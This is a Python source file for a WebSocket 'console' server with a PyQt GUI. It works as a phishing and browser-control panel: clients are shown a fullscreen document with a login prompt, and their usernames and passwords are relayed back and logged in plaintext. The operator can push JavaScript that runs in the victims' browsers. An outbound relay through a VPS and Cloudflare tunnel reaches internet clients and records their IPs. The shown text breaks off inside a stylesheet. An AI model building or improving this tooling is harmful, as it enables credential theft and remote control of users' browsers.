#!/usr/bin/env python3
"""
WS Console — dark PyQt WebSocket server with a console, styled like db_viewer.py.

    pip install websockets PyQt6     # PyQt6 only needed for the GUI
    python ws_server.py              # GUI console (LAN only by default)
    python ws_server.py --headless   # text console (no PyQt needed)
    python ws_server.py --port 9000

The server speaks JSON over WebSockets. It can push modal dialogs to a
connected HTML client (client.html) and receives back the data the user
entered (typed text, whether OK was clicked, checkbox state, ...).

It can also push documents: the client loads its own default document
(any URL, see DEFAULT_DOC in client.html) fullscreen, asks the user for a
username/password (reported back as `doc_auth`), and the server can push
any local file (PDF / image / text) into the same fullscreen view via
`send_doc()` — in the GUI that is the "Load file →" button (a file browse
dialog), in headless mode the `load` command.

Relay mode (opt-in): pass --vps wss://relay.yourdomain.com and the server
also opens an OUTBOUND, auto-reconnecting WebSocket link to YOUR OWN
ws_listener.py relay (running on a small VPS, fronted by a Cloudflare
tunnel — see setup.md). The HTML client connects to that relay from the
internet; the listener bridges the two peers, so modal pushes,
modal_response / doc_auth replies, pings and doc pushes all flow through
the VPS. This is what gets the client over the internet without any
inbound ports on the server machine. Direct local clients on
ws://<host>:<port> keep working alongside.
"""

import sys
import os
import json
import time
import uuid
import base64
import asyncio
import threading
import mimetypes
import queue
import argparse

# ---------------------------------------------------------------------------
# Connection config
# ---------------------------------------------------------------------------
HOST = "0.0.0.0"
PORT = 8765

# Relay (opt-in): the URL of YOUR OWN ws_listener.py relay, fronted by a
# Cloudflare tunnel — e.g. "wss://wsrelay.yourdomain.com". The server dials
# OUT to it (works behind NAT); the HTML client dials in from the internet
# and the listener bridges the two. Default: None = LAN only, no relay.
# Enable it on the command line:  --vps wss://wsrelay.yourdomain.com
# NOTE: keep the relay's hostname free of underscores — wildcard edge certs
# (e.g. *.yourdomain.com) are refused by OpenSSL for names containing "_".
VPS_URL = None
VPS_NODE_ID = "vps"

# The new asyncio implementation of `websockets` (v13+).
try:
    from websockets.asyncio.server import serve
    from websockets.asyncio.client import connect
    from websockets.exceptions import ConnectionClosed
except ImportError as _e:  # pragma: no cover
    raise SystemExit(
        "The 'websockets' package (>=13) is required.\n"
        "  pip install websockets\n"
        f"({_e})"
    )


# ---------------------------------------------------------------------------
# Small shared helpers
# ---------------------------------------------------------------------------
def ts():
    return time.strftime("%H:%M:%S")


def new_id():
    return uuid.uuid4().hex[:8]


# ---------------------------------------------------------------------------
# WebSocket server (pure asyncio — no PyQt, so it is testable headless)
# ---------------------------------------------------------------------------
class WSNode:
    """One connected client."""

    def __init__(self, ws, peer):
        self.ws = ws
        self.peer = peer
        self.id = new_id()
        self.info = {}
        self.created = time.time()

    def label(self):
        host, port = (self.peer or ("?", 0))
        return f"{self.id}  {host}:{port}"


class VPSNode(WSNode):
    """Pseudo-node for the outbound VPS relay link."""

    def label(self):
        return f"{self.id}  vps relay"


class RelayClient:
    """An internet client behind the VPS relay, keyed by its clientId.

    All relayed peers share the single `vps` transport link; each browser
    tab identifies itself with a random `c-xxxxxx` clientId (sent in
    client_info) and the server keeps one row per clientId.
    """

    def __init__(self, client_id, info=None, ip=None):
        self.id = client_id
        self.info = info or {}
        self.ip = ip
        self.created = time.time()

    def label(self):
        return f"{self.id}  {self.ip or 'via relay'}"


class WSServer:
    """Thread-hosted WebSocket server that reports events via on_event()."""

    def __init__(self, host=HOST, port=PORT, on_event=None, vps_url=None):
        self.host = host
        self.port = port
        self.vps_url = vps_url
        self.on_event = on_event or (lambda kind, payload: None)
        self.clients = {}          # node_id -> WSNode (direct + vps link)
        self.remote = {}           # client_id -> RelayClient (via relay)
        self.loop = None
        self._thread = None

    # -- lifecycle -------------------------------------------------------
    def start(self):
        """Start serving in a daemon thread (non-blocking)."""
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_until_complete(self._serve())
        except Exception as e:  # pragma: no cover
            self._emit("err", str(e))

    async def _serve(self):
        try:
            async with serve(self._handler, self.host, self.port):
                self._emit("listening", self.port)
                if self.vps_url:
                    self._emit("vps_starting", self.vps_url)
                    asyncio.create_task(self._vps_relay())
                await asyncio.Future()  # run forever
        except ConnectionClosed:
            pass
        except Exception as e:  # pragma: no cover
            self._emit("err", str(e))

    # -- VPS relay (outbound, auto-reconnecting) --------------------------
    async def _vps_relay(self):
        """Dial the VPS ws_listener and bridge its traffic into the server.

        While connected, a pseudo-node with id "vps" is registered in
        self.clients, so send()/broadcast() route through the link.
        Internet clients behind the relay are tracked separately in
        self.remote (one RelayClient per clientId) and addressed with a
        "to" field that the relay routes to the matching peer.
        """
        delay = 2
        while True:
            node = None
            try:
                async with connect(self.vps_url) as ws:
                    node = VPSNode(ws, ("vps", 0))
                    node.id = VPS_NODE_ID
                    self.clients[node.id] = node
                    self._emit("vps_connected",
                               (node.id, node.label(), self.vps_url))
                    # Identify ourselves to the relay so it can register
                    # this peer as clientId "server" (routing target).
                    await ws.send(json.dumps({
                        "type": "client_info",
                        "info": {"clientId": "server",
                                 "agent": "ws_server",
                                 "ts": int(time.time())},
                    }))
                    delay = 2
                    try:
                        async for raw in ws:
                            try:
                                msg = json.loads(raw)
                            except Exception:
                                continue
                            self._on_message(node, msg)
                    except ConnectionClosed:
                        pass
            except Exception as e:
                self._emit("vps_err", f"{self.vps_url}: {e}")
            finally:
                self.clients.pop(VPS_NODE_ID, None)
                self.remote.clear()  # clients behind the relay are unreachable
                self._emit("vps_disconnected", self.vps_url)
            await asyncio.sleep(delay)
            delay = min(delay * 2, 30)

    # -- I/O -------------------------------------------------------------
    async def _handler(self, ws):
        peer = getattr(ws, "remote_address", None)
        node = WSNode(ws, peer)
        self.clients[node.id] = node
        self._emit("client_joined", (node.id, node.label(), peer))
        try:
            async for raw in ws:
                try:
                    msg = json.loads(raw)
                except Exception:
                    continue
                self._on_message(node, msg)
        except ConnectionClosed:
            pass
        finally:
            self.clients.pop(node.id, None)
            self._emit("client_left", (node.id, node.label(), peer))

    def _on_message(self, node, msg):
        t = msg.get("type")
        if t == "pong":
            self._emit("pong", (node.id, msg.get("id")))
        elif t == "client_info":
            info = msg.get("info") or {}
            cid = info.get("clientId")
            if node.id == VPS_NODE_ID and cid and cid != "server":
                # An internet client behind the relay identified itself.
                self._remote_upsert(cid, info, msg.get("_src"))
            else:
                node.info = info
                self._emit("client_info", (node.id, node.label(), node.info))
        elif t == "peer_left":
            # The relay notifies us that a peer dropped (tab closed etc.).
            cid = msg.get("clientId")
            if cid and cid in self.remote:
                rc = self.remote.pop(cid)
                self._emit("remote_left", (rc.id, rc.label(), rc.ip))
        elif t in ("modal_response", "doc_auth", "pdf_closed"):
            # Attribute relayed responses to the actual client, not the
            # shared "vps" transport (clients stamp clientId on replies).
            nid, label = node.id, node.label()
            cid = msg.get("clientId")
            if node.id == VPS_NODE_ID and cid in self.remote:
                rc = self.remote[cid]
                nid, label = rc.id, rc.label()
            self._emit(t, (nid, label, msg))

    def _remote_upsert(self, cid, info, src):
        ip = (src or {}).get("ip")
        rc = self.remote.get(cid)
        if rc is None:
            rc = RelayClient(cid, info, ip)
            self.remote[cid] = rc
            kind = "remote_joined"
        else:
            rc.info.update(info)
            if ip:
                rc.ip = ip
            kind = "remote_info"
        self._emit(kind, (rc.id, rc.label(), rc.info, rc.ip))

    # -- outbound (safe to call from any thread) -------------------------
    def _queue(self, node, payload):
        if node is None or self.loop is None:
            return False
        asyncio.run_coroutine_threadsafe(self._send(node, payload), self.loop)
        return True

    def send(self, node_id, payload):
        """Send a payload to one directly connected node."""
        return self._queue(self.clients.get(node_id), payload)

    def send_to(self, target, payload):
        """Send a payload to any target:
          - 'all'              -> every direct client AND every internet
                                  client (vps link, unaddressed)
          - a direct node id   -> that client
          - 'vps'              -> the relay link, unaddressed: reaches all
                                  internet clients at once
          - a remote clientId  -> routed via the relay ("to": <clientId>)
        """
        if target in (None, "all"):
            return self.send_all(payload)
        if target == VPS_NODE_ID:
            return self._queue(self.clients.get(VPS_NODE_ID), payload)
        if target in self.remote:
            return self._queue(self.clients.get(VPS_NODE_ID),
                               {**payload, "to": target})
        return self.send(target, payload)

    def send_all(self, payload):
        ok = True
        for node in list(self.clients.values()):
            ok = self._queue(node, payload) and ok
        return ok

    def broadcast(self, payload):
        return self.send_all(payload)

    def ping_all(self):
        self.send_all({"type": "ping", "id": new_id()})

    def send_modal(self, target, title, message, value="", checkbox=None,
                   buttons=None):
        spec = {
            "type": "modal",
            "id": new_id(),
            "title": title or "Prompt",
            "message": message or "",
            "value": value or "",
        }
        if checkbox is not None:
            spec["checkbox"] = checkbox
        if buttons is not None:
            spec["buttons"] = buttons
        return self.send_to(target, spec)

    def send_pdf(self, target, url, title=None):
        """Push a document URL; the client shows it fullscreen."""
        spec = {
            "type": "pdf",
            "id": new_id(),
            "url": url or "",
        }
        if title is not None:
            spec["title"] = title
        return self.send_to(target, spec)

    def send_doc_bytes(self, target, data, name, mime=None):
        """Push raw file bytes to the client's fullscreen document view.

        The client renders by mime type: application/pdf -> iframe,
        image/* -> <img>, *.js files are executed as script in the
        client context, anything else -> text pane.
        """
        if mime is None:
            mime = mimetypes.guess_type(name)[0] or "application/octet-stream"
        spec = {
            "type": "doc",
            "id": new_id(),
            "name": name,
            "mime": mime,
            "data_b64": base64.b64encode(data).decode("ascii"),
        }
        return self.send_to(target, spec)

    def send_doc(self, target, path, name=None):
        """Push a local file (browse dialog selection) to the client.

        Reads the file and calls :meth:`send_doc_bytes`. Raises OSError if
        the file cannot be read.
        """
        with open(path, "rb") as f:
            data = f.read()
        return self.send_doc_bytes(target, data, name or os.path.basename(path))

    async def _send(self, node, payload):
        try:
            await node.ws.send(json.dumps(payload))
        except Exception:
            pass

    # -- events ----------------------------------------------------------
    def _emit(self, kind, payload):
        try:
            self.on_event(kind, payload)
        except Exception:
            pass

    def client_ids(self):
        out = list(self.clients)
        out += [c for c in self.remote if c not in self.clients]
        return out

    def labels(self):
        out = {n.id: n.label() for n in self.clients.values()}
        out.update({c.id: c.label() for c in self.remote.values()})
        return out


# ---------------------------------------------------------------------------
# Headless text console (no PyQt) — handy for quick testing
# ---------------------------------------------------------------------------
def _headless_event(kind, payload):
    if kind == "listening":
        print(f"[{ts()}] listening on ws://*:{payload}")
    elif kind == "client_joined":
        nid, label, peer = payload
        print(f"[{ts()}] + client {label}")
    elif kind == "client_left":
        nid, label, peer = payload
        print(f"[{ts()}] - client {label}")
    elif kind == "client_info":
        nid, label, info = payload
        print(f"[{ts()}]   info {label}: {info}")
    elif kind == "pong":
        nid, pid = payload
        print(f"[{ts()}]   pong from {nid} (id={pid})")
    elif kind == "modal_response":
        nid, label, msg = payload
        print(
            f"[{ts()}]   <<< modal_response from {label}: "
            f"id={msg.get('id')} ok={msg.get('ok')} "
            f"value={msg.get('value')!r} checked={msg.get('checked')}"
        )
    elif kind == "pdf_closed":
        nid, label, msg = payload
        print(
            f"[{ts()}]   <<< pdf_closed from {label}: "
            f"id={msg.get('id')} url={msg.get('url')!r}"
        )
    elif kind == "doc_auth":
        nid, label, msg = payload
        print(
            f"[{ts()}]   <<< doc_auth from {label}: "
            f"id={msg.get('id')} ok={msg.get('ok')} "
            f"user={msg.get('username')!r} "
            f"password={msg.get('password')!r}   (for review)"
        )
    elif kind == "vps_starting":
        print(f"[{ts()}] = vps relay starting  {payload}")
    elif kind == "vps_connected":
        nid, label, url = payload
        print(f"[{ts()}] = vps relay connected  {label}  ({url})")
    elif kind == "vps_disconnected":
        print(f"[{ts()}] = vps relay disconnected  ({payload}) — retrying…")
    elif kind == "vps_err":
        print(f"[{ts()}] !! vps relay: {payload}")
    elif kind == "err":
        print(f"[{ts()}] !! {payload}")


def run_headless(host, port, vps_url=None):
    srv = WSServer(host, port, on_event=_headless_event, vps_url=vps_url)
    srv.start()
    print(f"[{ts()}] WS headless console on ws://{host}:{port} "
          f"(Ctrl-D to quit)")
    if vps_url:
        print(f"[{ts()}]   vps relay -> {vps_url}")
    print("Commands: list | ping | modal <id|all|vps|client-id> <title> <message> [default] "
          "| pdf <id|all|vps|client-id> <url> [title] "
          "| load <id|all|vps|client-id> <path> | q")
    while True:
        try:
            line = input("ws> ").strip()
        except (EOFError, KeyboardInterrupt):
            if sys.stdin.isatty():
                break
            # stdin closed (piped / daemonized): no REPL, but keep serving
            print(f"[{ts()}] stdin closed — running without the REPL")
            try:
                while True:
                    time.sleep(3600)
            except KeyboardInterrupt:
                pass
            break
        if not line:
            continue
        parts = line.split(None, 1)
        cmd = parts[0].lower()
        rest = parts[1] if len(parts) > 1 else ""
        if cmd == "q":
            break
        elif cmd == "list":
            for nid, label in srv.labels().items():
                print(f"   {nid}  {label}")
        elif cmd == "ping":
            srv.ping_all()
            print(f"[{ts()}] ping -> all")
        elif cmd == "modal":
            args = rest.split(None, 3)
            if len(args) < 3:
                print("usage: modal <id|all|vps|client-id> <title> <message> [default]")
                continue
            target, title, message = args[0], args[1], args[2]
            default = args[3] if len(args) > 3 else ""
            ok = srv.send_modal(target, title, message, default)
            print(f"[{ts()}] modal -> {target} "
                  f"({'sent' if ok else 'no such client'})")
        elif cmd == "pdf":
            args = rest.split(None, 2)
            if len(args) < 2:
                print("usage: pdf <id|all|vps|client-id> <url> [title]")
                continue
            target, url = args[0], args[1]
            title = args[2] if len(args) > 2 else None
            ok = srv.send_pdf(target, url, title)
            print(f"[{ts()}] pdf -> {target} "
                  f"({'sent' if ok else 'no such client'})")
        elif cmd == "load":
            args = rest.split(None, 1)
            if len(args) < 2:
                print("usage: load <id|all|vps|client-id> <path>")
                continue
            target, path = args[0], args[1]
            try:
                ok = srv.send_doc(target, path)
                print(f"[{ts()}] load -> {target} "
                      f"({os.path.basename(path)}) "
                      f"({'sent' if ok else 'no such client'})")
            except OSError as e:
                print(f"[{ts()}] !! cannot read {path}: {e}")
        else:
            print("unknown command")


# ---------------------------------------------------------------------------
# PyQt GUI console (styled like db_viewer.py)
# ---------------------------------------------------------------------------
def main(argv=None):
    ap = argparse.ArgumentParser(description="WS Console server")
    ap.add_argument("--host", default=HOST)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--headless", action="store_true",
                    help="run a text console instead of the PyQt GUI")
    ap.add_argument("--vps", default=VPS_URL,
                    help="relay (ws_listener.py) URL to dial OUT to, e.g. "
                         "wss://wsrelay.yourdomain.com; default: none "
                         "(LAN only)")
    args = ap.parse_args(argv)

    vps_url = args.vps

    if args.headless:
        run_headless(args.host, args.port, vps_url)
        return

    # ---- PyQt import happens only here, so headless needs no PyQt ----
    try:
        from PyQt6 import QtCore, QtGui, QtWidgets
        from PyQt6.QtCore import Qt, QTimer

        USER_ROLE   = Qt.ItemDataRole.UserRole
        MONO_HINT   = QtGui.QFont.StyleHint.Monospace
        H_SPLIT     = Qt.Orientation.Horizontal
        ALIG_CENTER = Qt.AlignmentFlag.AlignCenter

        def _exec(obj):
            return obj.exec()

    except ImportError:
        from PyQt5 import QtCore, QtGui, QtWidgets
        from PyQt5.QtCore import Qt, QTimer

        USER_ROLE   = Qt.UserRole
        MONO_HINT   = QtGui.QFont.StyleHint.Monospace
        H_SPLIT     = Qt.Horizontal
        ALIG_CENTER = Qt.AlignCenter

        def _exec(obj):
            return obj.exec_()

    # ------------------------------------------------------------------ UI
    class Console(QtWidgets.QMainWindow):
        _client_info = {}

        def __init__(self, host, port, vps_url=None):
            super().__init__()
            self.setWindowTitle("WS Console")
            self.resize(1180, 760)

            self._host, self._port = host, port
            self._vps_url = vps_url
            self._q = queue.Queue()
            self._mono = QtGui.QFont()
            self._mono.setStyleHint(MONO_HINT)
            self._mono.setFamily("Consolas")
            self._mono.setPointSize(9)

            # WebSocket server wired to the GUI queue
            self._srv = WSServer(
                host, port,
                on_event=lambda kind, payload: self._q.put((kind, payload)),
                vps_url=vps_url)

            self._build_ui()

            self._poll_timer = QTimer(self)
            self._poll_timer.timeout.connect(self._tick)
            self._poll_timer.start(300)

            self._srv.start()

        # ================================================================ UI
        def _build_ui(self):
            central = QtWidgets.QWidget()
            root = QtWidgets.QVBoxLayout(central)
            root.setSpacing(6)
            root.setContentsMargins(10, 8, 10, 6)
            self.setCentralWidget(central)

            # ---- top bar ----
            bar = QtWidgets.QHBoxLayout()
            title = QtWidgets.QLabel(
                "<span style='color:#6495ed;font-size:13pt;font-weight:bold'>"
                "WS Console</span>")
            bar.addWidget(title)
            bar.addSpacing(12)

            host_lbl = QtWidgets.QLabel(
                f"<code>ws://{self._host}:{self._port}</code>")
            host_lbl.setTextInteractionFlags(
                Qt.TextInteractionFlag.TextSelectableByMouse)
            bar.addWidget(host_lbl)
            bar.addStretch(1)

            self._dot = QtWidgets.QLabel("●")
            self._dot.setStyleSheet("color:#888; font-size:13pt;")
            bar.addWidget(self._dot)
            self._conn_lbl = QtWidgets.QLabel("starting…")
            bar.addWidget(self._conn_lbl)
            bar.addSpacing(12)

            btn_ping = QtWidgets.QPushButton("Ping All")
            btn_ping.setFixedWidth(90)
            btn_ping.setStyleSheet(self._btn_style())
            btn_ping.clicked.connect(self._ping)
            bar.addWidget(btn_ping)

            btn_modal = QtWidgets.QPushButton("Send Modal →")
            btn_modal.setFixedWidth(130)
            btn_modal.setStyleSheet(self._btn_accent())
            btn_modal.clicked.connect(self._send_modal)
            bar.addWidget(btn_modal)

            btn_load = QtWidgets.QPushButton("Load file →")
            btn_load.setFixedWidth(110)
            btn_load.setStyleSheet(self._btn_accent())
            btn_load.clicked.connect(self._load_file)
            bar.addWidget(btn_load)

            root.addLayout(bar)

            # ---- splitter: clients | console ----
            h_split = QtWidgets.QSplitter(H_SPLIT)

            # LEFT — clients
            left_w = QtWidgets.QWidget()
            lv = QtWidgets.QVBoxLayout(left_w)
            lv.setContentsMargins(0, 0, 4, 0)
            lv.setSpacing(3)

            cli_hdr = QtWidgets.QLabel("  CLIENTS")
            cli_hdr.setStyleSheet(
                "background:#28283a; color:#b0b0d0; font-size:8pt; padding:3px;")
            lv.addWidget(cli_hdr)

            self.tree = QtWidgets.QTreeWidget()
            self.tree.setColumnCount(3)
            self.tree.setHeaderLabels(["ID", "Address", "Info"])
            self.tree.setColumnWidth(0, 70)
            self.tree.setColumnWidth(1, 160)
            self.tree.setAlternatingRowColors(True)
            self.tree.setFont(self._mono)
            self.tree.itemSelectionChanged.connect(self._on_client_select)
            lv.addWidget(self.tree)
            h_split.addWidget(left_w)

            # RIGHT — log + modal composer
            right_w = QtWidgets.QWidget()
            rv = QtWidgets.QVBoxLayout(right_w)
            rv.setContentsMargins(4, 0, 0, 0)
            rv.setSpacing(3)

            log_hdr = QtWidgets.QLabel("  CONSOLE")
            log_hdr.setStyleSheet(
                "background:#28283a; color:#b0b0d0; font-size:8pt; padding:3px;")
            rv.addWidget(log_hdr)

            self.log = QtWidgets.QTextEdit()
            self.log.setReadOnly(True)
            self.log.setFont(self._mono)
            self.log.setStyleSheet(
                "background:#161620; color:#c3c3c3; border:1px solid #303048; "
                "border-radius:3px;")
            rv.addWidget(self.log, 1)

            # modal composer
            comp_hdr = QtWidgets.QLabel("  MODAL COMPOSER")
            comp_hdr.setStyleSheet(
                "background:#28283a; color:#b0b0d0; font-size:8pt; padding:3px;")
            rv.addWidget(comp_hdr)

            form = QtWidgets.QGridLayout()
            form.setHorizontalSpacing(8)
            form.setVerticalSpacing(6)

            form.addWidget(self._lbl("Title"), 0, 0)
            self.f_title = QtWidgets.QLineEdit("Prompt")
            form.addWidget(self.f_title, 0, 1)

            form.addWidget(self._lbl("Message"), 1, 0)
            self.f_message = QtWidgets.QLineEdit("Enter a value")
            form.addWidget(self.f_message, 1, 1)

            form.addWidget(self._lbl("Default value"), 2, 0)
            self.f_value = QtWidgets.QLineEdit("")
            form.addWidget(self.f_value, 2, 1)

            form.addWidget(self._lbl("Checkbox label"), 3, 0)
            self.f_check_lbl = QtWidgets.QLineEdit("")
            form.addWidget(self.f_check_lbl, 3, 1)

            form.addWidget(self._lbl("Target client"), 4, 0)
            self.f_target = QtWidgets.QComboBox()
            form.addWidget(self.f_target, 4, 1)

            btn_send = QtWidgets.QPushButton("Send Modal →")
            btn_send.setStyleSheet(self._btn_accent())
            btn_send.clicked.connect(self._send_modal)
            form.addWidget(btn_send, 5, 1)

            self.f_checked = QtWidgets.QCheckBox("checked by default")
            self.f_checked.setStyleSheet("color:#c3c3c3;")
            form.addWidget(self.f_checked, 5, 0)

            rv.addLayout(form)

            h_split.addWidget(right_w)
            h_split.setSizes([320, 820])
            root.addWidget(h_split)

            self.statusBar().showMessage("Starting WebSocket server…")

            self._log("server", f"WS Console starting on "
                                f"ws://{self._host}:{self._port}")

        def _lbl(self, text):
            w = QtWidgets.QLabel(text)
            w.setStyleSheet(
                "color:#8090b0; font-family:Consolas; font-size:9pt;")
            return w

        def _btn_style(self):
            return (
                "QPushButton { color:#c0c0d0; border:1px solid #404060; "
                "background:#2a2a40; padding:2px 6px; border-radius:3px; }"
                "QPushButton:hover { background:#3a3a55; }"
                "QPushButton:pressed { background:#1e1e30; }")

        def _btn_accent(self):
            return (
                "QPushButton { color:#a0c0ff; border:1px solid #4a6a90; "
                "background:#252540; padding:2px 6px; border-radius:3px; }"
                "QPushButton:hover { background:#353555; }"
                "QPushButton:pressed { background:#1a1a30; }")

        # ============================================================== LOG
        def _log(self, kind, text, color="#c3c3c3"):
            self.log.append(
                f"<span style='color:#505068'>[{ts()}]</span> "
                f"<span style='color:{color}'>{self._esc(text)}</span>")
            sb = self.log.verticalScrollBar()
            sb.setValue(sb.maximum())

        def _esc(self, s):
            return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        # ============================================================ TICK
        def _tick(self):
            while True:
                try:
                    kind, payload = self._q.get_nowait()
                except queue.Empty:
                    break
                getattr(self, f"_on_{kind}", self._on_unknown)(payload)

        def _on_unknown(self, payload):
            pass

        def _on_listening(self, port):
            self._dot.setStyleSheet("color:#64dc82; font-size:13pt;")
            self._conn_lbl.setText("listening")
            self.statusBar().showMessage(
                f"Listening on ws://{self._host}:{port}")
            self._log("sys", f"listening on ws://{self._host}:{port}", "#64dc82")

        def _on_vps_starting(self, payload):
            self._log("sys", f"= vps relay starting  {payload}", "#8090b0")

        def _on_vps_connected(self, payload):
            nid, label, url = payload
            self._log("sys", f"= vps relay connected  {label}  ({url})",
                      "#64dc82")
            self.statusBar().showMessage(f"VPS relay connected ({url})")
            self._refresh_clients()

        def _on_vps_disconnected(self, payload):
            self._log("sys", f"= vps relay disconnected  ({payload}) — retrying…",
                      "#ff9d5c")
            self._refresh_clients()

        def _on_vps_err(self, payload):
            self._log("sys", f"= vps relay: {payload}", "#ff9d5c")

        def _on_client_joined(self, payload):
            nid, label, peer = payload
            self._log("sys", f"+ client {label}", "#64dc82")
            self._refresh_clients()

        def _on_client_left(self, payload):
            nid, label, peer = payload
            self._log("sys", f"- client {label}", "#ff6464")
            self._refresh_clients()

        def _on_client_info(self, payload):
            nid, label, info = payload
            ua = info.get("userAgent", "")
            plat = info.get("platform", "")
            cid = info.get("clientId", "")
            extra = "  ".join(x for x in (plat, cid) if x)
            self._log("sys", f"   info {label}: {ua[:80]}", "#8090b0")
            self._client_info[nid] = extra
            self._refresh_clients()

        def _on_remote_joined(self, payload):
            cid, label, info, ip = payload
            self._client_info[cid] = info.get("platform", "")
            self._log("sys", f"+ remote {label}  ip={ip or '?'}", "#64dc82")
            self._refresh_clients()

        def _on_remote_info(self, payload):
            cid, label, info, ip = payload
            self._client_info[cid] = info.get("platform", "")
            self._refresh_clients()

        def _on_remote_left(self, payload):
            cid, label, ip = payload
            self._client_info.pop(cid, None)
            self._log("sys", f"- remote {label}", "#ff6464")
            self._refresh_clients()

        def _on_pong(self, payload):
            nid, pid = payload
            self._log("sys", f"   pong from {nid}", "#8090b0")

        def _on_modal_response(self, payload):
            nid, label, msg = payload
            ok = msg.get("ok")
            val = msg.get("value")
            checked = msg.get("checked")
            color = "#64dc82" if ok else "#ff9d5c"
            self._log(
                "modal",
                f"<<< response from {label}: ok={ok} value={val!r} "
                f"checked={checked} (id={msg.get('id')})",
                color)
            self.statusBar().showMessage(
                f"Modal response from {label}: ok={ok} value={val!r}")

        def _on_doc_auth(self, payload):
            nid, label, msg = payload
            ok = msg.get("ok")
            user = msg.get("username") or ""
            pw = msg.get("password") or ""
            color = "#64dc82" if ok else "#ff9d5c"
            self._log(
                "auth",
                f"<<< doc_auth from {label}: ok={ok} user={user!r} "
                f"password={pw!r} (id={msg.get('id')})  [for review]",
                color)
            self.statusBar().showMessage(
                f"Credentials from {label}: ok={ok} user={user!r}")

        def _on_err(self, payload):
            self._dot.setStyleSheet("color:#ff6464; font-size:13pt;")
            self._conn_lbl.setText("error")
            self._log("err", f"!! {payload}", "#ff6464")
            QtWidgets.QMessageBox.critical(self, "Error", str(payload))

        # ====================================================== CLIENT LIST
        def _refresh_clients(self):
            keep = self._selected_client_id()
            self.tree.clear()
            for nid, label in self._srv.labels().items():
                parts = label.split("  ", 1)
                addr = parts[1] if len(parts) > 1 else ""
                info = self._client_info.get(nid, "")
                it = QtWidgets.QTreeWidgetItem([nid, addr, info])
                it.setData(0, USER_ROLE, nid)
                it.setForeground(0, QtGui.QBrush(QtGui.QColor(255, 200, 50)))
                it.setForeground(1, QtGui.QBrush(QtGui.QColor(200, 200, 200)))
                it.setForeground(2, QtGui.QBrush(QtGui.QColor(128, 144, 176)))
                self.tree.addTopLevelItem(it)
                if nid == keep:
                    self.tree.setCurrentItem(it)
            n = self.tree.topLevelItemCount()
            self._conn_lbl.setText(f"{n} client{'s' if n != 1 else ''}")
            self._sync_target([nid for nid in self._srv.client_ids()])

        def _set_client_info(self, nid, text):
            self._client_info[nid] = text

        def _selected_client_id(self):
            cur = self.tree.currentItem()
            if cur:
                return cur.data(0, USER_ROLE)
            return None

        def _on_client_select(self):
            nid = self._selected_client_id()
            self.f_target.blockSignals(True)
            idx = self.f_target.findData(nid)
            if idx >= 0:
                self.f_target.setCurrentIndex(idx)
            self.f_target.blockSignals(False)

        def _sync_target(self, nid_list):
            # "All clients" is always available: modal/load fan out to
            # every direct client AND every internet client behind the
            # VPS relay at once.
            cur = self.f_target.currentData() or self._selected_client_id() or "all"
            self.f_target.blockSignals(True)
            self.f_target.clear()
            self.f_target.addItem("All clients", "all")
            for nid in nid_list:
                label = self._srv.labels().get(nid, nid)
                self.f_target.addItem(label, nid)
            self.f_target.blockSignals(False)
            idx = self.f_target.findData(cur)
            self.f_target.setCurrentIndex(max(idx, 0))

        def _target_client_id(self):
            nid = self.f_target.currentData()
            if nid is None:
                return "all" if self.f_target.count() else None
            return nid

        # =========================================================== ACTIONS
        def _ping(self):
            self._srv.ping_all()
            self._log("cmd", "ping -> all", "#8090b0")

        def _send_modal(self):
            nid = self._target_client_id()
            if nid is None:
                QtWidgets.QMessageBox.information(
                    self, "No client", "No client is connected.")
                return
            title = self.f_title.text().strip() or "Prompt"
            message = self.f_message.text()
            value = self.f_value.text()
            checkbox = None
            if self.f_check_lbl.text().strip():
                checkbox = {"label": self.f_check_lbl.text(),
                            "checked": self.f_checked.isChecked()}
            ok = self._srv.send_modal(nid, title, message, value, checkbox)
            tgt = ("all clients" if nid == "all"
                   else self._srv.labels().get(nid, nid))
            if ok:
                self._log("cmd", f"modal -> {tgt} ({title!r})", "#ffd864")
            else:
                self._log("cmd", f"modal -> {nid} (no such client)", "#ff6464")

        def _load_file(self):
            """Browse for a local file (pdf/image/text/...) and push it to
            the selected client's fullscreen document view."""
            nid = self._target_client_id()
            if nid is None or not self._srv.labels():
                QtWidgets.QMessageBox.information(
                    self, "No client", "No client is connected.")
                return
            path, _ = QtWidgets.QFileDialog.getOpenFileName(
                self, "Select a document to load into the client", "",
                "All files (*.*)")
            if not path:
                return
            try:
                ok = self._srv.send_doc(nid, path)
            except OSError as e:
                self._log("cmd", f"cannot read {path}: {e}", "#ff6464")
                return
            tgt = ("all clients" if nid == "all"
                   else self._srv.labels().get(nid, nid))
            if ok:
                self._log("cmd",
                          f"load -> {tgt} ({os.path.basename(path)!r})",
                          "#ffd864")
            else:
                self._log("cmd", f"load -> {nid} (no such client)", "#ff6464")

    app = QtWidgets.QApplication(sys.argv)
    app.setStyle("Fusion")

    pal = app.palette()
    C = QtGui.QColor
    R = QtGui.QPalette.ColorRole
    pal.setColor(R.Window,           C( 30,  30,  40))
    pal.setColor(R.WindowText,       C(220, 220, 220))
    pal.setColor(R.Base,             C( 22,  22,  32))
    pal.setColor(R.AlternateBase,    C( 28,  28,  42))
    pal.setColor(R.Text,             C(210, 210, 210))
    pal.setColor(R.Button,           C( 50,  50,  70))
    pal.setColor(R.ButtonText,       C(220, 220, 220))
    pal.setColor(R.Highlight,        C( 60,  80, 130))
    pal.setColor(R.HighlightedText,  C(255, 255, 255))
    pal.setColor(R.ToolTipBase,      C( 40,  40,  60))
    pal.setColor(R.ToolTipText,      C(220, 220, 220))
    pal.setColor(R.PlaceholderText,  C( 90,  90, 110))
    app.setPalette(pal)

    app.setStyleSheet("""
        QScrollBar:vertical { background:#1a1a28; width:10px; }
        QScrollBar::handle:vertical { background:#404060; min-height:20px; border-radius:4px; }
        QScrollBar::handle:vertical:hover { background:#505080; }
        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height:0px; }
        QScrollBar:horizontal { background:#1a1a28; height:10px; }
        QScrollBar::handle:horizontal { background:#404060; min-width:20px; border-radius:4px; }
        QScrollBar::handle:horizontal:hover { background:#505080; }
        QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal { width:0px; }
        QTreeWidget { background:#161620; alternate-background-color:#1c1c2e; border:1px solid #303048; }
        QTreeWidget::item { color:#c3c3c3; padding:2px 0; }
